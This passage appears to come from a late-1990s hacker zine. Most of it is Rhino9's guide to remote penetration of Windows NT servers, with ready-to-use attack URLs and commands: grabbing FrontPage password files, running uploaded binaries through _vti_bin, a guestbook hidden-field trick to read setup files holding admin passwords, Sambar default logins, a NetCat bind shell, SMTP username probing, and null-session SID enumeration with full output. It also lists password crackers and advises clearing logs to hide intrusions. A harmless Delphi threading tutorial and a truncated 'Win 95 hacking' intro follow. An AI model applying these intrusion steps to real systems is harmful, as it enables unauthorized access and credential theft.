+An intruder may also poke around the other _vti directories, as sometimes 
+these can hold sensitive information. After the username is known and 
+the password has been cracked, the intruder could then re-connect with 
+his copy of Frontpage and provide it with the credentials, or the 
+credentials could be used in other ways, such as mapping a network drive,
+provided the same username/password combination would work in that context.
+
+(NOTE: Service.pwd is not the only known password file name. 
+Authors.pwd, admin.pwd, users.pwd and administrators.pwd have also been seen.)
+
+Of the Frontpage related exploits, the binary ftp exploit is 
+probably considered to be the most sophisticated, even though it's 
+also extremely easy to accomplish. The binary attack would allow an 
+intruder to execute any binary via frontpage extensions. 
+The attacker must find a server that supports frontpage and also supports 
+FTP anonymous writable. After connecting to the server via FTP, 
+the intruder would create a directory named _vti_bin. He would then 
+upload whichever executable he wishes to run into the newly created directory.
+Once the executable file has been uploaded, the intruder would issue the following URL:
+
+http://www.someserver.com/_vti_bin/uploaded_file
+
+The server will then be more than happy to execute the file for the visitor
+of the site.
+
+Shortly after the binary attack made its rounds, the _vti_cnf bug 
+was found. This would allow an intruder to view all files in a 
+certain directory. By replacing the index.html with _vti_cnf, 
+the intruder would see all files in that directory, and possibly 
+gain access to them. The attack is issued as follows:
+
+Standard structure - http://www.someserver.com/some_directory_structure/index.html
+Attack structure - http://www.someserver.com/some_directory_structure/_vti_cnf
+
+It may seem as though there could be countless variants of the 
+same attack type that could issue similar results. Sadly enough, 
+that is a somewhat accurate statement. Many of these flaws are 
+found by people playing with variants of previous flaws, but not
+all flaws affecting NT web services come from Internet Information Server.
+There are other web server software packages that will run on NT, 
+like the well known Apache web server. Of course, with these third 
+party web server packages and seperately released scripts that run
+on these third party packages, new flaws are bound to show up.
+
+Webcom Datakommunikation released a cgi script that would allow 
+visitors of a website to sign a guestbook. The name of the cgi script 
+is wguest.exe. By issuing the proper commands, this little cgi script 
+allows an attacker to view any text file on your server. 
+
+The form page where a visitor would sign the guestbook contains a 
+number of hidden fields. One of these hidden input fields is as 
+follows (as reported by David Litchfield):
+
+input type="hidden" name="template"
+value="c:\inetpub\wwwroot\gb\template.htm">
+or
+input type="hidden" name="template" value="/gb/template.htm">
+
+Template.htm here is the file that will be displayed by wguest.exe 
+after the user has entered his information. To exploit this an attacker
+views the source and saves the document to his desktop and edits this 
+line by changing the path to whatever file he wants to view, eg.
+
+input type="hidden" name="template"
+value="c:\winnt\system32\$winnt$.inf">
+
+[If an unattended install was done the admin password can be gleaned from this file]
+He then clicks on "Submit" and then wguest.exe will display this file.
+This was not tested with pwl files. However the attacker must know
+the exact path of the file he wishes to view.
+
+Another 'generic' HTTPD exploit involves a third party webserver
+product that runs on WindowsNT called Sambar Server. The following is
+a direct quote from posting:
+
+<quote>
+It is possible to view the victim's HDD. Asume you find a computer
+running Sambar Server by searching the Internet with these key-words:
+
++sambar +server +v4.1
+If you find a site like: http://www.site.net/ then do a test, 
+run a little perl script...
+
+http://www.site.net/cgi-bin/dumpenv.pl
+
+Now you see the complete environment of the victims computer, 
+including his path. Now you can try to login as the administrator by this url:
+
+http://www.site.net/session/adminlogin?RCpage=/sysadmin/index.stm
+
+The default login is: admin and the default password is blank. 
+If the victim hasn't changed his settings, you now can control his server. 
+Another feature is to view the victims HDD. If you were able to run 
+the perl script you should also be able (in most cases) to view 
+directory's from his path. Most people have c:/program files and 
+c:/windows in the path line, so what you can do is:
+
+http://www.site.net/c:/program files/sambar41
+
+<end quote>
+
+The next small item in this section has to do with Netscape Enterprise Server. 
+Some versions of the software react to the ?PageServices parameter 
+by allowing users access to a directory listing. 
+
+http://www.site.net/?PageServices is how this would be done.
+
+Finally a word on FTP. FTP can be a secure thing. Tons of people 
+will argue that platforms and version dependancy make it more secure, 
+and for the most part this is true. Most seasoned security profressionals 
+will tell you that version and platform do not amount to anything 
+without an educated end admin. We are adding this quick note in 
+here due to the number of servers Rhino9 has been able to penetrate
+based on FTP permissions. Some admins will not notice, or understand, 
+the "Anonymous world writable" privs on their webserver. 
+Rhino9 has questioned and worked its way into an entire network via 
+one misconfigured FTP server.
+
+It is not difficult to upload NetCat via anon-ftp-writable to a server,
+execute it via URL, and bind it to a port. From that point on, 
+you have a remote 'shell' on the NT box. By connecting to that remote
+NetCat bind, keep in mind that all command line functions issued from 
+that shell seem to be sent from THAT SHELL, with the NetCat binding 
+running in the context of an internal user.
+
+===================================================================
+MISCELLANEOUS INFORMATION GATHERING AND PENETRATION TECHNIQUES
+===================================================================
+
+(As with any type of security related document that attempts to 
+encompass many different topics, some topics will seem out of place 
+among the rest of them. This section deals with different techniques 
+that really did not fit anywhere else in the document. 
+Excuse the somewhat fragmented nature of this section.)
+
+If there is one product that Rhino9 as a team has spent time tearing apart, 
+it is WinGate. The first problem encountered with WinGate was the 
+ability to 'bounce' through a WinGate with all subsequent connections 
+appearing to come from the WinGate itself. This little flaw was 
+extremely easy to take advantage of. One would telnet to the WinGate 
+port and be presented with a prompt such as:
+
+WinGate>
+
+At this prompt, you could issue a seperate telnet command or take 
+advantage of the WinGates SOCKS ability to establish other connections. 
+While the developer of this software product was quick to release 
+fixes and bulletins for this, the next release also had problems.
+
+In a default installation of WinGate v2.1, the WinGate machine was 
+configured with a logging service. The logging service listens on 
+port 8010 of the WinGate machine. By establishing an HTTP connection 
+to this port, a possible intruder would be presented with two general feeds:
+
+"Connection Cannot Be Established"
+
+Or, the intruder would get a listing of the wingate machines hard drive. 
+Keep in mind, that this is a default install and can easily be fixed 
+by chaning the default install configuration.
+
+As Exchange server became a more and more popular mail server package, 
+flaws began to appear. The first flaw to emerge was a password caching 
+problem within the architecture of Exchange. This is a quote directly 
+from the original posting:
+
+<quote>
+Create a user xyz on your NT domain with an Exchange 5.0 server with POP3 service. 
+Set xyz's password to a1234. Things work fine so far. Now change xyz's password to b5678.
+You will find that POP3 mail clients can log in using either password a1234 
+or b5678 for user xyz. Now change the password to something else. 
+You will find that a POP3 client (or direct telnet to port 110) will
+allow you to log in as xyz using any of the three passwords. They all work.
+The Exchange 5.0 service POP3 connector caches passwords in a non-hashing mechanism
+so that all the passwords remain active. This does not affect the new web
+page interface to get your mail which uses a different authentication.
+Nor does it affect NT logons. In non-POP3 logins, the passwords are not
+cached (except NNTP and LDAP). As you can see, the caching problem can 
+be very serious in certain environments.
+
+<end quote>
+
+Another technique that an intruder could use to gather information is
+based on the SMTP port of a target mail server. In order to be SMTP 
+compliant and have the ability to fully interact with other mail entities
+on the internet, NT based SMTP mail servers understand the verify feature.
+By establishing a telnet session to the SMTP port of the mail server, an 
+intruder could issue the verify command in conjunction with a username. 
+If the verify feature is enabled, the server will tell the intruder 
+if it is a valid username or not. The attack command would appear as such:
+
+vrfy administrator (would verify if a user named administrator existed)
+
+On some mail systems, the intruder would be required to go through 
+the HELO sequence first, but this is extremely trivial.
+Needless to say, this could lead to an intruder gathering a list 
+of valid usernames to use in other attacks.
+
+===================================================================
+FINAL WORDS
+===================================================================
+
+The authors of this document hope that you have enjoyed reading 
+it and that you have learned something from it. The authors would 
+also like to remind the readers that we wish to keep this document 
+current. Planning future releases of this document, with up to date 
+information allows us to begin keeping a publicly available living 
+record that administrators and security professionals can use. Send
+your information gathering and remote penetration techniques to 
+neonsurge@hotmail.com. As new versions of this document become available, 
+notice will go out on such lists as NTBugTraq. The home of the 
+document itself will be at the Rhino9 website (http://rhino9.ml.org),
+The authors of this document have three other documents planned for
+ release in the near future, all of them part of the NT WarDoc series. 
+We have an indepth Denial of Service paper in the works, Local 
+Penetration Techniques paper, and a paper dealing with techniques 
+one could use to gaurd against the topics of the other papers.
+We look forward to feedback from the community.
+
+===================================================================
+APPENDIX A: THE NET COMMAND
+===================================================================
+
+Below is a listing of all Net commands and their functions:
+
+Net Accounts: This command shows current settings for password, 
+logon limitations, and domain information. It also contains options 
+for updating the User accounts database and modifying password and 
+logon requirements.
+
+Net Computer: This adds or deletes computers from a domains database.
+
+Net Config Server or Net Config Workstation: Displays config info 
+about the server service. When used without specifying Server or Workstation, 
+the command displays a list of configurable services.
+
+Net Continue: Reactivates an NT service that was suspended by a NET PAUSE command.
+
+Net File: This command lists the open files on a server and has 
+options for closing shared files and removing file locks.
+
+Net Group: This displays information about group names and has 
+options you can use to add or modify global groups on servers.
+
+Net Help: Help with these commands
+
+Net Helpmsg message#: Get help with a particular net error or function message.
+
+Net Localgroup: Use this to list local groups on servers. You can also modify those groups.
+
+Net Name: This command shows the names of computers and users to 
+which messages are sent on the computer.
+
+Net Pause: Use this command to suspend a certain NT service.
+
+Net Print: Displays print jobs and shared queues.
+
+Net Send: Use this command to send messages to other users, computers,
+or messaging names on the network.
+
+Net Session: Shows information about current sessions. Also has 
+commands for disconnecting certain sessions.
+
+Net Share: Use this command to list information about all 
+resources being shared on a computer. This command is also 
+used to create network shares.
+
+Net Statistics Server or Workstation: Shows the statistics log.
+
+Net Stop: Stops NT services, cancelling any connections the service 
+is using. Let it be known that stopping one service may stop other 
+services.
+
+Net Time: This command is used to display or set the time for a 
+computer or domain.
+
+Net Use: This displays a list of connected computers and has 
+options for connecting to and disconnecting from shared resources.
+
+Net User: This command will display a list of user accounts for 
+the computer, and has options for creating a modifying those accounts.
+
+Net View: This command displays a list of resources being shared on a computer. 
+Including netware servers.
+
+**Special note on DOS and older Windows Machines: The commands listed above 
+are available to Windows NT Servers and Workstation. DOS and older 
+Windows clients have these NET commands available:
+
+Net Config
+Net Diag (runs the diagnostic program)
+Net Help
+Net Init (loads protocol and network adapter drivers.)
+Net Logoff
+Net Logon
+Net Password (changes password)
+Net Print
+Net Start
+Net Stop
+Net Time
+Net Use
+Net Ver (displays the type and version of the network redirector)
+Net View
+
+===================================================================
+APPENDIX B: AN EXAMPLE OF THE SID TOOLS IN USE
+===================================================================
+
+Below is an example of the SID Tools in action, quoted directly from
+the public posting about this tool:
+This flaw works with the User2Sid and Sid2User utilities. The utilities
+make function of the LookupAccountName and LookupAccountSid WIN32 
+Functions. These functions must be executed by a user with EVERYONE 
+access, not very hard to accomplish. Here's what happens:
+
+1) Looking up a SID of any domain account, for example Domain Users
+
+user2sid "domain users"
+S-1-5-21-201642981-56263093-24269216-513
+
+Now we know all the subauthorities for the current domain. 
+Domain accounts only differ by the last number of the SID, called a RID.
+
+2) Looking up the built-in administrator name (RID is always 500)
+sid2user 5 21 201642981 56263093 24269216 500
+Name is SmallUser
+Domain is DomainName
+Type of SID is SidTypeUser
+
+Now it is possible to look up all the domain accounts from 
+the very first one (RID = 1000 for the first account, 1001 for 
+the second and so on, RIDs are never used again for the current installation).
+
+sid2user 5 21 201642981 56263093 24269216 1000
+sid2user 5 21 201642981 56263093 24269216 1001
+...
+Remember that the anonymous account is also part of the Everyone group. 
+It also happens that the anonymous account is not audited by the
+logon/logoff feature.
+
+Below is an example of what you can learn provided the netbios 
+ports are open (the listing is fictional).
+
+nslookup www.xyz.com
+Non-authoritative answer:
+Name: www.xyz.com
+Address: 131.107.2.200
+net use \\131.107.2.200\ipc$ "" /user:""
+The command completed successfully.
+user2sid \\131.107.2.200 "domain users"
+S-1-5-21-201642981-56263093-24269216-513
+Number of subauthorities is 5
+Domain is XYZ_domain
+Length of SID in memory is 28 bytes
+Type of SID is SidTypeGroup
+sid2user \\131.107.2.200 5 21 201642981 56263093 24269216 500
+Name is XYZAdmin
+Domain is XYZ_domain
+Type of SID is SidTypeUser
+sid2user \\131.107.2.200 5 21 201642981 56263093 24269216 1000
+Name is
+Domain is XYZ_domain
+Type of SID is SidTypeDeletedAccount
+sid2user \\131.107.2.200 5 21 201642981 56263093 24269216 1001
+Name is Simpson
+Domain is XYZ_domain
+Type of SID is SidTypeUser
+sid2user \\131.107.2.200 5 21 201642981 56263093 24269216 1112
+LookupSidName failed - no such account
+Default NT Install SID's are:
+DOMAINNAME\ADMINISTRATOR 
+S-1-5-21-917267712-1342860078-1792151419-500 (=0x1F4)
+DOMAINNAME\GUEST 
+S-1-5-21-917267712-1342860078-1792151419-501 (=0x1F5)
+Built-In Global Groups 
+DOMAINNAME\DOMAIN ADMINS 
+S-1-5-21-917267712-1342860078-1792151419-512 (=0x200)
+DOMAINNAME\DOMAIN USERS
+S-1-5-21-917267712-1342860078-1792151419-513 (=0x201)
+DOMAINNAME\DOMAIN GUESTS
+S-1-5-21-917267712-1342860078-1792151419-514 (=0x202)
+Built-In Local Groups 
+BUILTIN\ADMINISTRATORS S-1-5-32-544 (=0x220)
+BUILTIN\USERS S-1-5-32-545 (=0x221)
+BUILTIN\GUESTS S-1-5-32-546 (=0x222)
+BUILTIN\ACCOUNT OPERATORS S-1-5-32-548 (=0x224)
+BUILTIN\SERVER OPERATORS S-1-5-32-549 (=0x225)
+BUILTIN\PRINT OPERATORS S-1-5-32-550 (=0x226)
+BUILTIN\BACKUP OPERATORS S-1-5-32-551 (=0x227)
+BUILTIN\REPLICATOR S-1-5-32-552 (=0x228)
+Special Groups
+\CREATOR OWNER S-1-3-0
+\EVERYONE S-1-1-0
+NT AUTHORITY\NETWORK S-1-5-2
+NT AUTHORITY\INTERACTIVE S-1-5-4
+NT AUTHORITY\SYSTEM S-1-5-18
+
+===================================================================
+APPENDIX C: RELATIONAL LOCATIONS OF DEFAULT IIS STRUCTURES
+===================================================================
+
+C:\InetPub\wwwroot <Home>
+C:\InetPub\scripts /Scripts
+C:\InetPub\wwwroot\_vti_bin /_vti_bin
+C:\InetPub\wwwroot\_vti_bin\_vti_adm /_vti_bin/_vti_adm
+C:\InetPub\wwwroot\_vti_bin\_vti_aut /_vti_bin/_vti_aut
+C:\InetPub\cgi-bin /cgi-bin
+C:\InetPub\wwwroot\srchadm /srchadm
+C:\WINNT\System32\inetserv\iisadmin /iisadmin
+C:\InetPub\wwwroot\_vti_pvt /_vti_pvt
+C:\InetPub\wwwroot\samples\Search\QUERYHIT.HTM Internet Information Index Server sample
+C:\Program Files\Microsoft FrontPage\_vti_bin
+C:\Program Files\Microsoft FrontPage\_vti_bin\_vti_aut
+C:\Program Files\Microsoft FrontPage\_vti_bin\_vti_adm
+C:\WINNT\System32\inetserv\iisadmin\htmldocs\admin.htm /iisadmin/isadmin
+Frontpage specific files and their functions:
+/_vti_inf.html Ensures that frontpage server extensions are installed.
+/_vti_pvt/service.pwd Contains the encrypted password files. Not used on IIS and WebSite servers.
+/_vti_pvt/authors.pwd On Netscape servers only. Encrypted. Names and passwords of authors.
+/_vti_pvt/administrators.pwd
+/_vti_log/author.log If author.log is there it will need to be cleaned to cover an intruders tracks.
+
+===================================================================
+APPENDIX D: THE SERVICES
+===================================================================
+
+I have received countless pieces of mail regarding the NT services. 
+People are asking what they do and should certain ones be disabled. 
+Whats follows is a list of the services, an explanation of each one, 
+and recommendations for setup. -NeonSurge
+
+ALERTER: Relies on NetBIOS over TCP/IP for network communication. 
+This service allows a user to receive messages from other machines.
+These messages could be warnings or some type of pre-determined network
+information. I recommend disabling the Alerter service on machines due 
+to its NetBIOS dependancy and the fact that it is hardly ever used.
+
+CLIPBOOK SERVER: Relies on NetBIOS over TCP/IP for network communication.
+This server service allows the contents of the clipboard to be shared
+over a network. Few use it, and it should be disabled due to the ability
+of a remote intruder possible gleaning information from it.
+
+COMPUTER BROWSER: The Computer Browser service allows one to view 
+available network resources by browsing via Network Neighborhood. 
+When active on a server, the server will register its name through a 
+NetBIOS broadcast or directly to a WINS server. I recommend disabling 
+this service.
+
+DHCP CLIENT: This service should be set to automatic if the machine 
+is a dhcp client, if not, disable it.
+
+DIRECTORY REPLICATOR: This service allows NT systems to import and 
+export directory contents. If you content replication is not needed, 
+disable this service.
+
+EVENT LOG: I recommend always using this service because it is the 
+service responsible for logging activity on the server, including 
+security activity.
+
+LICENSE LOGGING SERVICE: Used to track use of licenses by different 
+applications, it does not have any serious impact on the network and 
+should be set to automatic (which is the default setting).
+
+MESSENGER SERVICE: Relies on NetBIOS over TCP/IP for network communication.
+Similar to the Alerter service in both design and function. I recommend
+stopping this service to prevent username enumeration via NBTSTAT commands.
+
+NET LOGON: This service is used by both Server and Workstation to provide
+for user authentication. TSERhis service is said to be required at all
+times and runs as the built in SYSTEM user.
+
+NETWORK DDE and DDE DSDM: These service provide dynamic data exchange.
+DDE is used for such applications as Chat (thats important!), 
+and other applications that may require this type of functionality.
+These services are considered to be a moderate risk due to their TCP 
+connection accepting states.
+
+NETWORK MONITOR AGENT: Network Monitor Agent is used to monitor, or sniff, 
+the traffic passing through a network adapter card. If the SMS 
+version of this software is in use, an administrator can remotely
+monitor traffic on other network adapter cards.
+
+NT LM SECURITY SUPPORT PROVIDER: This service is present to help with
+backwards compatibility and authentication with older software packages.
+
+PLUG AND PLAY: Used to configure PnP devices.
+
+REMOTE PROCEDURE CALL LOCATOR AND SERVICES: RPC is a protocol that 
+is used to encapsulate fucntion calls over a network. Its defualt 
+configuration, automatic, is standard and should be left alone. 
+This service is considered to pose a high security risk, but the 
+dependancies existing on this service are too great to disable it.
+
+ROUTING AND REMOTE ACCESS SERVICE: This is an add-on service that 
+enhances the functionality of WindowsNT. If you are using a modem 
+to dial-out of your NT system, this service should be set to automatic.
+If you are using its routing features, also set it to automatic.
+
+SCHEDULE: This service allows an application to be executed at a 
+pre-specified time and date. This can pose a serious security threat
+as this service can be used to start applications under the SYSTEM context.
+
+SERVER: Used as the key to all server-sdie NetBIOS applications, 
+this service is somewhat needed. Without this service, some of the 
+administrative tools, such as Server Manager, could not be used. 
+If remote administration or access to the machine is not needed, 
+I highly recommend disabling this service. Contrary to popular belief, 
+this service is NOT needed on a webserver.
+
+SPOOLER: The spooler service is used to accept requests for print 
+jobs from clients, and to allow the local system to spool jobs to a 
+network printer. This service should be set to automatic.
+
+TCP/IP NETBIOS HELPER: This service helps and enhances NBT and the
+Net Logon service. Because the Net Logon service should be set to 
+automatic, so should this service.
+
+TELEPHONY SERVICE: This service is used to manage telephony drivers 
+and the properties for dialing. On a system that does not use any 
+type of telephony or RAS devices should have this service disabled.
+
+UPS: This service is used in serial communication with an
+Uninterruptible Power Supply.
+
+WORKSTATION: This service allows for outbound NetBIOS connections. 
+Because it is used in outbound connections only, it is normally not
+a security risk and should be set to automatic.
+
+===================================================================
+APPENDIX E: URL's
+===================================================================
+
+Sid Tools: http://www.technotronic.com/microsoft.html
+Eudpass: http://rhino9.ml.org/wardoc
+1nf0ze: http://rhino9.ml.org/wardoc
+FireFTP: http://rhino9.ml.org/wardoc
+Grinder: http://rhino9.ml.org/software
+Glide: http://rhino9.ml.org/wardoc
+John The Ripper (DES Cracker): http://www.false.com/security/john/index.html
+WS_FTPBug: http://rhino9.ml.org/wardoc
+L0phtCrack (NT Password Cracker): http://www.l0pht.com
+PWDump: http://rhino9.ml.org/wardoc
+NAT: http://www.technotronic.com/microsoft.html
+
+===================================================================
+APPENDIX F: THE LMHOSTS FILE
+===================================================================
+
+Although most security professionals are used to working with a HOSTS
+file, WindowsNT actually uses two text files to resolve hostnames to 
+their adresses. WindowsNT still uses a HOSTS file, but it also uses 
+an LMHOSTS file.
+
+Much like a HOSTS file, an LMHOSTS is a flat, sequential text 
+file that is used to resolve computer names (NetBIOS) to addresses. 
+The LMHOSTS file also allows one to use keywords, which gives it 
+greater functionality and flexibility than a HOSTS file.
+
+The keywords that the LMHOSTS file uses are #PRE, #DOM:domain, 
+#INCLUDE filename, #BEGIN_ALTERNATE, and #END_ALTERNATE. 
+If something follows a hash mark that is not one of these keywords, 
+it is treated as a remark.
+
+#PRE: If this keyword follows an entry in an LMHOSTS file, it tells 
+WindowsNT to pre-load that entry into the name cache. 
+This allows the windows system to resolve the name much quicker.
+
+#DOM: The #DOM tag entry causes WindowsNT to associate that entry 
+with whatever domain you specify (i.e. #DOM:accounting). 
+This helps NT resolve certain names more efficiently because it does 
+not have to consult routing tables to find out which domain the entry 
+belongs in.
+
+#INCLUDE: This entry tells WindowsNT where to look for other 
+LMHOSTS files that reside on other machines. 
+When using this function, one should specify the UNC path to the 
+other LMHOSTS file. The #BEGIN_ALTERNATE and #END_ALTERNATE are 
+used in conjunction with the #INCLUDE tag and should appear before
+and after the #INCLUDE tag.
+
+===================================================================
+RHINO9 SECURITY RESEARCH TEAM - HTTP://RHINO9.ML.ORG
+===================================================================
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Window's Threads (by Chiraz)
+
+In this article, I want to hand out some examples to multi-threading
+in a window's environment, discuss it's uses, advantages and when 
+you should use/not use them.
+
+I. What is a thread?
+
+Basically, a thread is a new path of execution for your processor. 
+Do not confuse them with a real process, which stores much more 
+information about it's origin in memory and really runs very different. 
+It is also harder to communicate between processes then between 
+threads run in a single process.
+
+When starting an application ALWAYS one thread of execution is started, 
+called the primary thread. You can start other threads from this path 
+to do, many times, a system heavy task, such as searching a hard drive
+for files, spooling large quantities of text to a printer or cycling
+text in a memo control. In my example, I will show you a caption bar 
+cycler, which can directly be used in your delphi application (just neat).
+You'll be able to download it from the bottom of the page, so don't start 
+copying and pasting yet :)
+
+In early versions of windows, threads weren't supported. 
+However, multiple processes were (you can also refer to them as multiple tasks). 
+This is why windows is called a 'multi-tasking' environment. 
+Win3.1 though differs from '95 and up in the implementation of multi-tasking.
+In win3.1 applications give control back to windows to be able to share 
+CPU cycles, this is called cooperative multi-tasking. However, in win9x 
+(and much like UN*X works), processes get assigned CPU cycles. 
+If execution is stopped for one cycle and given to the next, the first
+thread is said to be pre-empted. Hence, this implementation is called 
+pre-emptive multi-tasking.
+
+II. When to use threads?
+
+First of all, threads do introduce new problems, especially with access 
+to files, memory and (yes!) your objects and controls on the form. 
+Because a running thread can loose normal 'synchronization' with others, 
+it is wrong to assume that for instance creating three threads which all
+add 3 to a certain number and printing that to the screen, will result
+in successive numbers printed. To clarify, this is what you may get 
+if you do not synchronize:
+2
+1
+3
+6
+4
+5
+8
+9
+11
+
+
+But before we delve too much into the theory, let's first examine 
+the TThread object. This object is the way a thread is implemented by
+Borland. You can use the object to manage your thread by calling it's 
+properties and methods, instead of basic and hard-coding the win API for this. 
+When getting a thread in your program (click New | Thread Object and name 
+it TCycleThread), all you'll see is:
+
+type
+TCycleThread = class(TThread)
+  private
+   {private declarations } 
+  protected
+    procedure Execute; override;
+end;
+
+
+
+You see? not much here. Anyways, in order to have a thread, you have to
+keep it running (not really in all cases, but let's assume you're carrying 
+out a task and on completion you'll destroy the thread again). 
+There is one procedure to override, which is Execute. Overriding a 
+procedure or function means not carrying out the method it has in it's ancestors.
+If in TObject Execute would mean for example printing an 'O' on the screen, 
+this 'O' will never be seen when overriding. Some procedures need to 
+be overridden, others don't. But consult other docs for that, we'll 
+carry on with threads
+
+
+III. How to create threads?
+
+First, do this to the type declaration you've created before:
+
+type
+TCycleThread = class(TThread)
+private
+FNewStr: string;
+function TakeOutChars(var From: string): string;
+function MoveChars(From: string; x: integer):string;
+function SetSpaces(x: integer): string;
+procedure SetCaption;
+protected
+procedure Execute; override;
+end;
+
+
+Ok, so here you can see I have added four private functions and procedures.
+One global variable exists as FNewStr, this holds the string to cycle in your 
+caption bar. They are private because they do not have to be called from other
+objects or modules. It's good practice to supply the proper access to your 
+functions and procedures, because it speeds up a bit and also you're less 
+prone to make mistakes. In order for one thread to work, we have to give it 
+a 'thing' to do.... so let's do it by implementing the Execute procedure:
+
+procedure TCycleThread.Execute;
+var Temp : string;
+Medium : integer;
+x: integer;
+amount: integer;
+textlen: integer;
+begin
+textlen := Length(FunkyCaption);
+FreeOnTerminate := True;
+for x:=0 to Length(FunkyCaption)-1 do
+Temp := Temp + Copy(FunkyCaption, textlen-x, 1);
+FNewStr := Temp;
+Synchronize(SetCaption);
+for x:= 1 to Length(FunkyCaption) div 2 do
+begin
+Temp := TakeOutChars(Temp);
+FNewStr := setspaces(x)+Temp;
+Synchronize(SetCaption);
+sleep(75);
+end;
+
+Delete(FNewStr,1,1);
+Insert(Copy(FunkyCaption, (Length(FunkyCaption) div 2), 1),
+FNewStr, (Length(FunkyCaption) div 2));
+for x:= 1 to (Length(FunkyCaption) div 2) do
+begin
+FNewStr := MoveChars(FunkyCaption, x);
+Synchronize(SetCaption);
+sleep(50);
+end;
+end;
+
+Ok, so what we see here is a bad example of coding... nonetheless, 
+it displays the goal of this article. FunkyCaption is declared as a 
+global variable to the mainForm unit, which caption is used to cycle 
+our text in. Because it is global and public, it can also be accessed 
+from other modules (look at a thread in the way of a module, albeit slightly different).
+Btw, Q for the gurus, any drawbacks on using global vars using threads 
+compared to passing on the var in the constructor?
+
+You can see I set the FreeOnTerminate property to True... 
+Since I have declared TCycleThread in my own MainForm unit,
+but within the TCycleThread prefix, I can access the methods
+and properties of this type. FreeOnTerminate is a property that 
+can be set to let the thread automatically be killed when it's done executing.
+If this is not done, you have to do this yourself, so let's leave it on for now.
+
+The synchronize function is very special. Basically, what happens when 
+calling it is a hidden thread window is created by the primary thread.
+Because a thread can pass parameters and other shit to this window, 
+it is used to synchronize data to update controls on your form. 
+One thing I must say is:
+
+
+ALWAYS USE Synchronize() WHEN UPDATING YOUR FORM!!!
+
+
+This is done because you want your application to be thread-safe. 
+It is possible to update your form directly from the thread, but 
+regarding access to the main form, you're not sure which thread has
+access and when, it may corrupt and crash your program.
+
+Moving on to the other stuff, I'll paste some other functions for 
+cycling the text in the next paragraphs:
+
+Procedure TCycleThread.SetCaption;
+begin
+MainForm.Caption := FNewStr;
+end;
+
+function TCycleThread.SetSpaces(x: integer): string;
+var K: integer;
+thestr: string;
+begin
+thestr:='';
+for k:=1 to x do
+thestr:=thestr+' ';
+result := thestr;
+end;
+
+function TCycleThread.TakeOutChars(var From: string): string;
+var j: integer;
+begin
+j:=Length(From);
+Delete(From,j,1);
+Delete(From,1,1);
+Result := From;
+end;
+
+function TCycleThread.MoveChars(From: string; x: integer):string;
+var j:integer;
+temp1 : string;
+begin
+j:= Length(From);
+temp1 := FNewStr;
+Delete(temp1,1,1);
+Delete(temp1,j,1);
+Insert(Copy(From, (j div 2)-x, 1), Temp1, (j div 2)-x);
+Insert(Copy(From, (j div 2)+x,1), temp1, (j div 2)+x);
+Result := temp1;
+end;
+
+
+
+Okay, so maybe the code can be optimized much and C++ programmers will 
+think shit of it, but I just don't have access to the power-functions
+like a C-library does and this code displays more of the things
+actually happening... Anyway, compiling this (first copy and paste 
+these things or the thing you have downloaded inside your MainForm unit), 
+you still don't see anything happening... for what?
+
+TCycleThread.Create(False);
+
+You need to instantiate a TCycleThread object first. It's simply 
+done by using this code. If using a separate module for a thread, 
+you first have to import it's unit into the uses clause. Well, 
+this code then should instantiate it for you and if you've set the 
+FunkyCaption var to some nice text, perhaps even read it from the 
+registry at formcreate (done, so it's possible), you can have the 
+text cycled in the caption bar at startup 
+(idea was actually taken from X-Treme IRC)...
+
+There are various pitfalls to look at though... Since the form is 
+updated from within the primary thread (by processing the queue), 
+suspending the primary thread with a sleep() operation or simply 
+putting a lot of pressure on the primary thread may slow down or 
+even stop the cycling in the caption bar. Make sure you give the 
+primary thread some breathing space, perhaps by creating OTHER 
+threads which will do the same things for you... For instance, 
+I have made an app that will do the following at startup:
+
+1. Cycle the text in the caption bar
+2. Read from an .ini file, put it in a combobox and display in a memo control
+3. play a video
+4. play sound
+5. read some arbitrary text and display in another memo
+6. create random ascii codes and display in yet another memo control
+
+
+
+hehe... and all at the same time, so it's really loading the CPU, 
+cannot really have other apps running at the same time, since it will
+gibber the video or sound... Other threads can easily be created 
+using the previous example. You might want to instantiate controls 
+at runtime and place them somewhere, which will make it easier to 
+destroy them when a thread exits. You can determine the execution 
+of a thread to let the OnTerminate event point to a procedure on 
+the mainform for instance and increment a global integer or something.
+
+IV. More about threads...
+
+Let's conclude with giving some hints on what is possible with threads. 
+You can set priorities and schedules of threads to run on certain times.
+A process is prioritized on the system, but threads can be relatively 
+prioritized TO this process... Processes have four distinct priorities, 
+while threads display 7...
+
+If you need to synchronize threads, because for instance information
+from a certain thread is needed in the other, you can do this with
+something called Critical Sections. They are the most straightforward 
+way to do it. It is declared in Delphi as a TRTLCriticalSection, 
+which basically means it's another record in the RunTimeLibrary... 
+it means one thread gets execution time while other threads are put 
+to sleep until the first thread 'leaves' the critical section and 
+wakens up the next thread to execute...
+
+Another way besides Critical sections is using more of the Windows API 
+to synchronize... this can be done with mutexes, where the threads are 
+synchronized OUTside the process, say across the process boundary to
+handle it's execution...
+
+Using semaphores, which build on mutexes, it is possible to assign access
+to a pre-determined number of threads using resource counting. 
+This gives you added functionality in managing threads and what to do to each of them.
+
+Finally, using threads, you can make your applications much more powerful. 
+For instance a search procedure on your hard disk will certainly lock
+up your primary thread if not using multi-threading. Normal coders work 
+around this by calling Application.ProcessMessages() within the loop 
+they are using. But wouldn't it be great to use threads instead? Then 
+the user can normally continue with the application, albeit in a 
+slower context, but functionality is not put down... using memory mapped 
+files for searching withIN files, you can create a very powerful 
+searching app that will look for words in files, without taking up 
+too much memory. If text files or other files (err... word filez? :) are > 10 Meg,
+which is often the case, you can create your own algorithm to search 
+for specific keywords without loading the complete file into memory... 
+But that's another topic
+
+For now, use threads with care, explore their use, and see how your 
+app can be given more interactivity and degrade your system availability :)
+
+
+
+by Chiraz
+
+
+
+If you put it on the MainForm unit, place it after the {$R .DFM} 
+compiler directive just below the uses clause in the implementation 
+part (that is below the type declaration of the mainform)
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+WIN 95' HACKING (By El Salvador) 3/1/1999
+
+"This text is for a informational
+purposes only, i take no responsbility
+what so ever for what you do with this
+text or knowledge what so ever"
+-El Salvador...
+
+ONLY WORKS FOR IBM COMPUTERS
+
+Index:
+
+1. Things You Will Need.
+2. How To Get By Security.
+3. How To Get By All Disabling Programs.
+4. Hidden FILES, DIRECTORIES, ETC.
+5. IMPORTANT.
+
+
+Chapter 1
+
+
+
